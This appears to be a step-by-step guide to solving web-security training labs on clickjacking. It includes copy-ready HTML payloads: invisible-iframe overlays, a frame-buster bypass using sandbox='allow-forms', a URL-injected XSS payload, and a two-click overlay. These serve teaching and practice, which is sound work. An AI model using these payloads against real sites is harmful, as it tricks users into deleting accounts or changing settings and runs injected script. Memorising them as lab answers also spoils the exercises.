
**Step 1 — Identify the lab type**

- Log in as `wiener:peter`. View the account page and inspect the source. Use this to identify which lab you have:

| What you observe                                                                                    | Lab type                               |
| --------------------------------------------------------------------------------------------------- | -------------------------------------- |
| Simple "Delete account" button, no extra steps                                                      | Basic clickjacking with CSRF token     |
| Email field that can be pre-filled via URL `?email=` parameter                                      | Clickjacking with prefilled form input |
| Email field + `?email=` works BUT page has a frame buster script in source                          | Clickjacking with frame buster bypass  |
| No sensitive action on account page — feedback/submit form has a `name` parameter reflected on page | DOM-based XSS via clickjacking         |
| Sensitive action requires a **confirmation step** (e.g. "Are you sure?")                            | Multistep clickjacking                 |

💡 Always check: (1) can the page be framed at all? (2) is there a frame buster script in source? (3) does the sensitive action complete in one click or two?

---

**If simple one-click action → Basic clickjacking with CSRF token**

- Go to the Exploit Server and paste into Body:

```html
<style>
    iframe {
        position:relative;
        width: 1000;
        height: 1000;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- Click **View exploit** first and adjust `top`/`left` values until "Click me" sits over the target button, then Store → Deliver to victim ✅

---

**If email field can be pre-filled via URL → Clickjacking with prefilled input**

- Check source for the email input field's parameter name (usually `email`)
- Go to Exploit Server and paste into Body:

html

```html
<style>
    iframe {
        position:relative;
        width: 1000;
        height: 1000;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:470;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=test@test.com"></iframe>
```

- View exploit, adjust `top`/`left` to align over the Update button, then Store → Deliver to victim ✅

---

**If email field works but page has frame buster script → Frame buster bypass**

- Look for `if(top !== self)` or similar frame buster in page source
- Same payload as above but add `sandbox="allow-forms"` to the iframe:

html

```html
<style>
    iframe {
        position:relative;
        width: 1000;
        height: 1000;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:470;
        left:60;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=test@test.com"></iframe>
```

💡 `sandbox="allow-forms"` disables JavaScript (killing the frame buster) while still allowing form submissions

- View exploit, align the div, Store → Deliver to victim ✅

---

**If feedback/contact form reflects input on the page → DOM-based XSS via clickjacking**

- Find the self-XSS — go to the feedback form and check which field (usually `name`) is reflected in the page after submission
- Pre-fill the XSS payload via URL parameters, appending `#feedbackResult` to scroll to the result
- Go to Exploit Server and paste into Body:

html

```html
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 900px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:815px;
        left:40px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=test@test.com&subject=test&message=test#feedbackResult"></iframe>
```

- View exploit, align div over the Submit button, Store → Deliver to victim ✅

---

**If sensitive action has a confirmation step → Multistep clickjacking**

- Identify both click targets: the initial action button and the confirmation button
- Go to Exploit Server and paste into Body — note two separate divs, each positioned over one button:

html

```html
<style>
    iframe {
        position:relative;
        width: 1000;
        height: 1000;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position:absolute;
        top:510;
        left:60;
        z-index: 1;
    }
    .secondClick {
        top:310;
        left:200;
    }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

💡 Adjust `top`/`left` for each div separately — first click triggers the action, second click confirms it

- View exploit, align both divs, Store → Deliver to victim ✅